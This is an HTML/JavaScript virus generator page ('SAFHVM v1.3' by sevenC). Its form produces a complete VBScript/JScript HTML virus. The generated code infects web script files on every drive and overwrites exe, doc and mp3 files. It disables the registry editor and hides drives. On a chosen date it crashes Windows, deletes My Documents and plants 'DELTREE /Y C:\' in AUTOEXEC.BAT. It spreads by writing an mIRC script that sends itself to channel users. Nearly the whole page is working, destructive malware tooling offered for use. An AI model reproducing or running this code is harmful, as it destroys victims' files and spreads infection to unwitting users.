<html>

<head>
<title>Simple and fast html.virus maker version 1.3</title>
<Script language="JavaScript">
<!--This is SAFHVM V.1.3 by sevenC / N0:7

var nama="";
var virus="";
var komentar="";
var tag="";
var register="";
var cap="";
var mes="";
var start="";
var date="";
var month="";
var year="";
var html=false;
var htm=false;
var cgi=false;
var php=false;
var asp=false;
var kill=false;
var hide=false;
var format=false;
var killd=false;
var crash=false;
var doc=false;
var mp3=false;
var exe=false;
var aktif=false;
var codewindow=false;

function Reset(seven) {
var kill=true;
var hide=true;
var format=true;
var killd=true;
var crash=true;
var html=true;
var htm=true;
var cgi=true;
var php=true;
var asp=true;
var doc=true;
var mp3=true;
var exe=true;
var aktif=true;
var codewindow=true;
 with (document) {
  seven.Virus.value = ".:SAFHVM:.";
  seven.Nama.value=".:seven cooL:.";
  seven.Komentar.value="Heyy... idiot ... SeVeN iS baCk to school....!! ";
  seven.Cap.value="Helloo... ";
  seven.Mes.value="You have been infeced";
  seven.Register.value="sevenC ";
  seven.Start.value="http://trax.to/sevenC ";
  seven.Date.value="19 ";
  seven.Month.value="9";
  seven.Year.value="2004";
  seven.Tag.value="When this file loaded you has been death with safhvm...hahahah...<br>http://sevenc.vze.com/";
  seven.Codewindow.checked=codewindow;
  seven.Html.checked=html;
  seven.Htm.checked=htm;
  seven.Cgi.checked=cgi;
  seven.Php.checked=php;
  seven.Asp.checked=asp;
  seven.Doc.checked=doc;
  seven.Mp3.checked=mp3;
  seven.Exe.checked=exe;
  seven.Kill.checked=kill;
  seven.Hide.checked=hide;
  seven.Killd.checked=killd;
  seven.Format.checked=format;
  seven.Crash.checked=crash;
  seven.Aktif.checked=aktif;
   }
}

function WinOpen(something) {
 msg=open(something,"DisplayWindow",
  "toolbar=no,directories=no,menubar=no,scrollbars=yes,resizable=yes");
  codewindow=true;
 return msg;
}
function write(stuff) {
 if (codewindow) msg.document.writeln(stuff);
  else document.writeln(stuff);
}
function wr(stuff) {
 if (codewindow) msg.document.write(stuff);
  else document.write(stuff);
}

function make(seven) {
nama=seven.Nama.value;
virus=seven.Virus.value;
komentar=seven.Komentar.value;
date=seven.Date.value;
month=seven.Month.value;
year=seven.Year.value;
register=seven.Register.Value;
start=seven.Start.Value;
tag=seven.Tag.value;
cap=seven.Cap.value;
mes=seven.Mes.value;
html=seven.Html.checked;
htm=seven.Htm.checked;
php=seven.Php.checked;
cgi=seven.Cgi.checked;
asp=seven.Asp.checked;
kill=seven.Kill.checked;
crash=seven.Crash.checked;
killd=seven.Killd.checked;
format=seven.Format.checked;
hide=seven.Hide.checked;
doc=seven.Doc.checked;
mp3=seven.Mp3.checked;
exe=seven.Exe.checked;
aktif=seven.Aktif.checked;
codewindow=seven.Codewindow.checked;

if (codewindow) var msg=WinOpen("");
if (virus=="") 
write("<h3>ERROR<BR><BR>Heyy idiot...!! Give me your fuckin virus name</h3>");
else if (nama=="")
   write("<h3>ERROR<BR><BR>Heyy idiot...!! Give me your fuckin name</h3>");
else if (komentar=="")
   write("<h3>ERROR<BR><BR>Heyy idiot...!! Give me your fuckin fake bytes I need it...!!</h3>");
else if (aktif==false)
   write("<h3>ERROR<BR><BR>Heyy idiot...!! It must be spreading</h3>");

else if (tag=="")
   write("<h3>ERROR<BR><BR>Tag / comment must be sign</h3>");
else {
  wr("<pre>");
    GenerateCode();
  wr("</pre><hr>");
 }
 if (codewindow) {
  wr("<form>");
  wr("<input type='button' value='Close' onclick='close()'>");
  wr("</form>");
 }
}
function GenerateCode() {
var k = unescape("%22"); 
if (htm) var h="fso.GetExtensionName(file.path)=&quot;htm&quot; ";
else var h="";


if (html) var ht="or fso.GetExtensionName(file.path)=&quot;html&quot; ";
else 
var ht="";

if (kill) var reg="ws.regwrite &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools&quot;, 1, &quot;REG_DWORD&quot;";
else
reg="";

if (crash) var cras="if day(now) = "+date+" and month(now) = "+month+" then <br>ws.run &quot;rundll32.exe user,disableoemlayer&quot;<br>end if<br>";
else
cras="";

if (killd) var docu="if day(now) = "+date+" and month(now) = "+month+" then<br>DirName=&quot;c:\\My Document\\&quot;<br>Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)<br>set Folder=fso.GetFolder(DirName)<br>Folder.delete<br>end if<br>";
else
docu="";

if (format) var forma="if day(now) = "+date+" and month(now) = "+month+" then <br>const forReading=1, forwriting=2, forappending=3<br>const tristateUsedefault = -2, TristateTrue = -1, TristateFalse=0<br>Dim BB3214XXX000, XXX00010XXX21122, ZZQWE32XX1000021, s<br>set BB3214XXX000=createobject(&quot;scripting.Filesystemobject&quot;)<br>BB3214XXX000.createtextfile &quot;C:\\AUTOEXEC.BAT&quot;<br>set XXX00010XXX21122 = BB3214XXX000.getfile(&quot;C:\\AUTOEXEC.BAT&quot;)<br>set ZZQWE32XX1000021 = XXX00010XXX21122.openastextstream(forwriting, TristateUsedefault)<br>ZZQWE32XX1000021.writeline &quot;echo off&quot;<br>ZZQWE32XX1000021.writeline &quot;DELTREE /Y C:\\&quot;<br>ZZQWE32XX1000021.close<p align=center>&nbsp;</p><br>end if<br>";
else
forma="";


if (php) 
var p="or fso.GetExtensionName(file.path)=&quot;php&quot; ";
else var p="";

if (cgi) var c="or fso.GetExtensionName(file.path)=&quot;cgi&quot; ";
else var c="";

if (asp)
var as="or fso.GetExtensionName(file.path)=&quot;asp&quot; ";
else 
var as="";

write("<HTML><BODY BGCOLOR=BLACK>");
write("<img src="+k+"safhvm.gif"+k+"<br>"); 
write("<FONT FACE=arial size=2 COLOR=red><b><br>Simple and fast html virus maker version 1.3</b><br>");
write("by sevenC / N0:7<br>");
write("http://trax.to/sevenC | http://sevenc.vze.com<br>");
write("mailto:sevenC_zone@yahoo.com<br>");
write("<br>");
write("Copy this code bellow save as html file<br>");
write("-------------------------------Cut here-----------------------------<font color=white><br>");
write("&lt;!--"+virus+"--&gt;<br>");
write("&lt;!--"+" made by " +nama+"--&gt;<br>");
write("&lt;!-- Generated with SAFHVM v.1.3 by sevenC / N0:7 --&gt;<br>");
write("&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;<br>");
write("&lt;script language=VBScript&gt;<br>");
write("'"+virus+"<br>");
write("'made by "+nama+"<br>");
write("'Generated with SAFHVM v.1.3 <br>");
write("<br>");
write("On Error Resume Next<br>");
write("MsgBox &quot;To view this page you must accept the ActiveX&quot;,vbinformation,&quot;Internet Explorer&quot;<br>");
write("Set fso=CreateObject(&quot;Scripting.FileSystemObject&quot;)<br>");
write("Set ws=CreateObject(&quot;WScript.Shell&quot;)<br>");
write("If err.number=429 Then<br>");
write("ws.Run javascript:location.reload()<br>");
write("Else<br>");
write("Dim Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder<br>");
write("Set fso=CreateObject(&quot;Scripting.FileSystemObject&quot;)<br>");
write("Set ws=CreateObject(&quot;WScript.Shell&quot;)<br>");
write("ws.RegWrite &quot;HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page&quot;, &quot;"+start+"&quot;<br>");
write("ws.RegWrite &quot;HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RegisteredOwner&quot;, &quot;"+register+"&quot;<br>");
write(""+reg+"<br>");
write("ws.regwrite &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\Explorer\\NoDrives&quot;, 1, &quot;REG_DWORD&quot;<br>");
write("ws.RegWrite &quot;HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WinLogon\\LegalNoticeCaption&quot;, &quot;"+cap+"&quot;<br>");
write("ws.RegWrite &quot;HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WinLogon\\LegalNoticeText&quot;, &quot;"+mes+"&quot;<br>");
write(" "+cras+"<br>");
write(" "+docu+"<br>");
write(" "+forma+"<br>");
write("set Trange = document.body.CreateTextRange<br>");
write("Set Drives = fso.drives<br>");
write("For Each Drive in Drives<br>");
write("If drive.isready then<br>");
write("Dosearch drive &amp; &quot;\\&quot; <br>");
write("end If  <br>");
write("next<br>");
write("function Dosearch(path)<br>");
write("on error resume next<br>");
write("Set Folder=fso.getfolder(path)<br>");
write("Set Files = folder.files<br>");
write("For Each File in files<br>");
write("If fso.GetExtensionName(file.path)=&quot;htm&quot; "+ht+p+c+as+"then<br>");
write("on error resume next<br>");
write("Set seven = FSO.OpenTextFile(file.path, 1, False)<br>");
write("FileContents = seven.ReadAll()<br>");
write("seven.close()<br>");
write("Set seven = FSO.OpenTextFile(file.path, 2, False)<br>");
write("seven.WriteLine &quot;&lt;!--"+virus+" by "+nama+"--&gt;&quot;<br>");
write("seven.Write(&quot;&lt;html&gt;&lt;body&gt;&quot; + Chr(13) + Chr(10))<br>");
write("seven.WriteLine TRange.htmlText<br>");
write("seven.WriteLine (&quot; &quot;)<br>");
write("seven.WriteLine (&quot;&lt;/body&gt;&lt;/html&gt;&quot;)<br>");
write("seven.Write(FileContents)<br>");
write("seven.close()<br>");
write("On error resume next<br>");
write("set a=fso.CreateTextFile(&quot;C:\\mirc\\script.ini&quot;)<br>");
write("a.WriteLine &quot;[script]&quot;<br>");
write("a.WriteLine &quot;n0=on 1:join:*.*: { if ( $nick ==$me ) {halt} &quot;<br>");
write("a.WriteLine &quot;n1=/dcc send $nick C:\\mirc\\joke.htm }&quot;<br>");
write("a.Close()<br>");
write("end if<br>");
write("If fso.GetExtensionName(file.path)=&quot;exe&quot; then<br>");
write("on error resume next<br>");
write("set drop = fso.createtextfile(File.path)<br>");
write("drop.writeline &quot;"+komentar+"&quot;<br>");
write("drop.close<br>");
write("end if<br>");
write("If fso.GetExtensionName(file.path)=&quot;doc&quot; then<br>");
write("on error resume next<br>");
write("set drop = fso.createtextfile(File.path)<br>");
write("drop.writeline &quot;"+komentar+"&quot;<br>");
write("drop.close<br>");
write("end if<br>");
write("If fso.GetExtensionName(file.path)=&quot;mp3&quot; then<br>");
write("on error resume next<br>");
write("set drop = fso.createtextfile(File.path)<br>");
write("drop.writeline &quot;"+komentar+"&quot;<br>");
write("drop.close<br>");
write("end if<br>");
write("next<br>");
write("Set Subfolders = folder.SubFolders<br>");
write("For Each Subfolder in Subfolders<br>");
write("Dosearch Subfolder.path <br>");
write("Next <br>");
write("end function <br>");
write("end if<br>");
write("--&gt;&lt;/script&gt;<br>");
write("&lt;script language=&quot;JavaScript&quot;&gt;<br>");
write("var viruspath, virus, code, fso, file<br>");
write("fso=new ActiveXObject(&quot;Scripting.FileSystemObject&quot;)<br>");
write("viruspath=window.location.pathname<br>");
write("viruspath=viruspath.slice(1)<br>");
write("virus=fso.OpenTextFile(viruspath,1)<br>");
write("code=virus.ReadAll()<br>");
write("virus.Close();<br>");
write("file=fso.CreateTextFile(&quot;C:\\\\mirc\\\\joke.htm&quot;, 2)<br>");
write("file.write(code)<br>");
write("file.Close()<br>");
write("&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<br>");
write("&lt;html&gt;&lt;head&gt;&lt;title&gt;"+virus+" by "+nama+"&lt;/title&gt;&lt;head&gt;&lt;body bgcolor=&quot;black&quot;&gt;<br>");
write("&lt;h3 align=&quot;center&quot;&gt;<br>");
write("&lt;font color=&quot;white&quot;&gt;<br>");
write("&lt;marquee&gt;"+virus+" by "+nama+"&lt;/marquee&gt;&lt;br&gt;&lt;br&gt;<br>");
write(tag+"&lt;br&gt;&lt;br&gt;");
write("Generated with Simple and fast html virus maker by sevenC / N0:7<br>");
write("&lt;/body&gt;&lt;/html&gt;<br>");
write("</font>-------------------------------Code finish -----------------------------<br>");
write("<B><font color=red>WARNING : SEVENC DOESN'T TAKE ANY RESPONSIBILITY FOR ANY DEMAGES <br>");
write("COZ THE CODE U MADE...!!!</font></b><br>");}

function Info() {
var k = unescape("%22"); 
 WinOpen("");
wr("<HTML><BODY BGCOLOR=BLACK><p align=center>");
wr("<img src="+k+"safhvm.gif"+k+"<br>"); 
wr("<FONT FACE=arial size=2 COLOR=red><b><br>Simple and fast html virus maker version 1.3</b><br>");
wr("by sevenC / N0:7<br>");
wr("<a href="+k+"http://trax.to/sevenC/"+k+"><font color=red><b>http://trax.to/sevenC </a></font>| <a href="+k+"http://sevenc.vze.com/"+k+"><font color=red>http://sevenc.vze.com</font></a></b><br>");
wr("mailto:sevenC_zone@yahoo.com<br>");
wr("<br>");
wr("-------------------------sevenC-----------------------------<br>");
wr("easy way to make powerfull html virus......<br>");
wr("The virus has U made has ability to search and infect all htm,html,php,asp & cgi script<br>");
wr("on computer target virus also erase all exe,mp3&doc files and droping your fuckin fake bytes<br>");
wr("Hide all drives,KiLL regeditor<br>");
wr("Payload : <br>");
wr("- Kill all documents<br>");
wr("- Deltree C:\ <br>");
wr("- Crash windows<br>");
wr("How virus can spread ??<br>");
wr("If there are mirc directory exist on target,virus copy it self as joke.htm to that directory<br>");
wr("and spreading with mirc....<br>");
wr("<br>");
wr("<font color=red><b>SevenC warning :</font><b><br>");
wr("Be very carefull use this... I hope U don't play with it<br>");
wr("you take all responsibility for any demages becoz of the virus <br>");
wr("<br>");
wr("Copyright(c)2003 --- N0:7 Laboratoryoum product</p><br>");
wr("<br>");
wr("<form><p align=center><input type=button value=Close onclick="+k+"Close()"+k+"></p></form>");
wr("<br>");
}

function credit(){
var k = unescape("%22"); 
WinOpen("");
wr("<HTML><head>");
wr("<BODY BGCOLOR=BLACK><p align=center>"); 
wr("<img src="+k+"safhvm.gif"+k+"<br>"); 
wr("<FONT FACE=arial size=2 COLOR=red><b><br>Simple and fast html virus maker version 1.3</b><br>");
wr("by sevenC / N0:7<br>");
wr("http://trax.to/sevenC | http://sevenc.vze.com<br>");
wr("mailto:sevenC_zone@yahoo.com<br>");
wr("<br>");
wr("<b>Thankz for : </b><br>");
wr("-Specialy for <font color=white>ibbm maker</font>,I don't know who is he,<br>but I've gotten Idea from his ibbm to make<br>");
wr(" html virus generator via html...greetz for you man..!!<br>");
wr("-<a href="+k+"http://clik.to/pinker/"+k+"><font color=white>Sector-s team </a></font>(VR,b0rkz,flinston,katro,KDS,Bota[X]Upper,An'sy,Hellscream...)<br>");
wr("-<font color=white>VXerz & non VXerz<br>");
wr("-VX virus team (h3rm1t,29a,Methaphase,NoMercy,Riot system,Chaos System,IKX,indovirus)</font><br>");
wr("-[K]alamar,Snakebytes,gigabyte,philet0a$ter,DvL,SAD1c,Jackie,VxD,alcopaul,FoxZ,-KD-<br>");
wr("-all in <font color=white>Jasakom,kecoak,medan-hacking,AntiHackerLink</font><br>");
wr("-logC,St'o,CBuG's,r3v0lt<br>");
wr("-#virus,#vir,#virii,indonesia,#Dos,#WareZ<br>");
wr("-all in <a href="+k+"http://www.keluargamiring.org/"+k+"><font color=white>KELUARGA MIRING FORUM</font></a> ( Admin & moderator ),Username,rudzt_logan,<br>#8,#99,sonny_punjadi");
wr(" DeepBlue,kyai_sadrun,My_Life,putri-bunga,Trash-heap-kennedy<br>redsneakers,bOrkZ,killi-lucu,hanks etc who know me<br>");
wr("-<a href="+k+"http://clik.to/pinker/"+k+"><font color=white>Pinker-community</a></font>(Joe,dumbweed,yosenux,topenk,MARCO,IWAN)<br>");
wr("-all in indovirus forum (admin,moderator),specialy iwing<br>");
wr("-And you...thanks for read this....</p><br>");
wr("<br><br>");
wr("-<b>And BIG FUCK For LAMERs like this : </b><br>");
wr("-WSH ( In jasakom forum )<br>");
wr(" And all chicken looser idiot person in jasakom who just only give his fuckin bullshit comment<br>");

}
//-->
</script>
<style fprolloverstyle>A:hover {color: #FF6600; font-weight: bold}
</style>
</head>

<body onload="Reset()" link="#FF0000" vlink="#FF0000" alink="#FF0000" text="#FF0000" bgcolor="#000000">

<p align="center"><img border="0" src="safhvm.gif" width="399" height="150"></p>

<form name="seven">
  <p align="center"><font face="Copperplate Gothic Light">Virus name : 
  <input type="text" name="Virus" size="20" style="border-width:1; background-color: #FF0000; text-decoration: blink; font-weight: bold; border-style: solid"> Your name : 
  <input type="text" name="Nama" size="20" style="border-width:1; background-color: #FF0000; font-weight: bold; border-style: solid"></font></p>
  <p align="center"><font face="Copperplate Gothic Light">Fake bytes ( you can put any character or mesages here) :&nbsp;<BR>
  <textarea rows="3" name="Komentar" cols="47" style="border:1px outset #000000; background-color: #FF0000; text-decoration: blink; "></textarea></font></p>
  <p align="center"><font face="Copperplate Gothic Light">Put your html tag or comment here :<BR>
  <textarea rows="3" name="Tag" cols="47" style="border:1px solid #000000; background-color: #FF0000; text-decoration: blink; "></textarea></font></p>
  <p align="center"><font face="Copperplate Gothic Light">Mesages startup :<BR>
  <input type="text" name="Mes" size="56" style="background-color: #FF0000; color: #000000; border-style: groove"></font></p>
  <p align="center"><font face="Copperplate Gothic Light">Caption :<BR>
  <input type="text" name="Cap" size="56" style="background-color: #FF0000; color: #000000; border-style: groove"></font></p>
  <p align="center"><font face="Copperplate Gothic Light">Start page :<BR>
  <input type="text" name="Start" size="56" style="background-color: #FF0000; color: #000000; border-style: groove"></font></p>
  <p align="center"><font face="Copperplate Gothic Light">Registered Owner :<BR>
  <input type="text" name="Register" size="56" style="background-color: #FF0000; color: #000000; border-style: groove"></font></p>
  <p align="center"><font face="Copperplate Gothic Light">Action : Kill
  regeditor</font><font color="#3399FF" face="Copperplate Gothic Light"><input type="checkbox" name="Kill" value="ON" checked style="background-color: #FF0000; color: #000000">
  </font><font face="Copperplate Gothic Light">Hide drives</font><font color="#3399FF" face="Copperplate Gothic Light"><input type="checkbox" name="Hide" value="ON" checked style="background-color: #FF0000; color: #000000"></font></p>
  <p align="center"><font face="Copperplate Gothic Light" color="#FF0000">Payload
  : </font><font face="Copperplate Gothic Light">Date <input type="text" name="Date" size="4" style="background-color: #FF0000; color: #000000; border-style: groove">
  Month <input type="text" name="Month" size="4" style="background-color: #FF0000; color: #000000; border-style: groove">
  Year <input type="text" name="Year" size="11" style="background-color: #FF0000; color: #000000; border-style: groove">
  <br>Payload action : </font><font color="#3399FF" face="Copperplate Gothic Light"><input type="checkbox" name="Format" value="ON" checked style="background-color: #FF0000; color: #000000"></font><font face="Copperplate Gothic Light">
  Format C: <input type="checkbox" name="Killd" value="ON" checked style="background-color: #FF0000">Kill
  document <font color="#FF0000"><input type="checkbox" name="Crash" value="ON" checked style="background-color: #FF0000"></font></font><font color="#FF0000"><font face="Copperplate Gothic Light">Crash</font></font><font face="Copperplate Gothic Light">&nbsp;
  </font></p>
  <p align="center"><font face="Copperplate Gothic Light">Infect files : </font>
  <font color="#3399FF" face="Copperplate Gothic Light"> 
  <input type="checkbox" name="Html" value="ON" checked style="background-color: #FF0000; color: #000000"></font><font face="Copperplate Gothic Light">.html
  <input type="checkbox" name="Htm" value="ON" checked style="background-color: #FF0000">.htm 
  <input type="checkbox" name="Asp" value="ON" checked style="background-color: #FF0000"></font><font face="Copperplate Gothic Light" color="#3399FF">.</font><font face="Copperplate Gothic Light">asp
  </font><font face="Copperplate Gothic Light" color="#3399FF">
  <input type="checkbox" name="Php" value="ON" checked style="background-color: #FF0000"></font><font face="Copperplate Gothic Light">.php 
  <input type="checkbox" name="Cgi" value="ON" checked style="background-color: #FF0000">.cgi</font><font face="Copperplate Gothic Light" color="#3399FF"><BR>
  </font><font face="Copperplate Gothic Light">Fake bytes droping : 
  <input type="checkbox" name="Mp3" value="ON" checked style="background-color: #FF0000">.mp3</font><font face="Copperplate Gothic Light" color="#3399FF">
  </font><font face="Copperplate Gothic Light">
  <input type="checkbox" name="Exe" value="ON" checked style="background-color: #FF0000">.exe 
  <input type="checkbox" name="Doc" value="ON" checked style="background-color: #FF0000">.doc</font><font face="Copperplate Gothic Light" color="#3399FF"><BR>
  </font><font face="Copperplate Gothic Light">miRc spreading :</font><font face="Copperplate Gothic Light" color="#3399FF">
  </font><font face="Copperplate Gothic Light"> 
  <input type="checkbox" name="Aktif" value="ON" checked style="background-color: #FF0000">
  activated</font></p>
  <p align="center"><font face="Copperplate Gothic Light">Output in different 
  window : 
  <input type="checkbox" name="Codewindow" value="ON" checked style="background-color: #FF0000"></font></p>
  <p align="center"><font face="Copperplate Gothic Light">
  <input type="button" Value="Make virus....!!" OnClick="make(this.form)" style="border:1px outset #3399FF; background-color: #FF0000; text-decoration: blink; font-weight: bold; ">
  <input type="reset" value="rEsEt..!!" OnClick="Reset()" style="border:1px outset #3399FF; background-color: #FF0000; text-decoration: blink; font-weight: bold; background-position: center 50%">
  </font><font face="Copperplate Gothic Light" color="#3399FF">
  <input type="button" value="About" OnClick="Info()" style="border:1px outset #3399FF; background-color: #FF0000; text-decoration: blink; font-weight: bold; "> 
  <input type="button" value="cReditZ..." OnClick="credit()" style="border:1px outset #3399FF; background-color: #FF0000; text-decoration: blink; font-weight: bold; "> </font></p>
</form>

<p align="center"><font color="#3399FF" face="Comic Sans MS">
<a href="index1.html" style="text-decoration: overline; background-color: #000000">Back
to index</a></font></p>



<p align="center">&nbsp;</p>



</body>

</html>
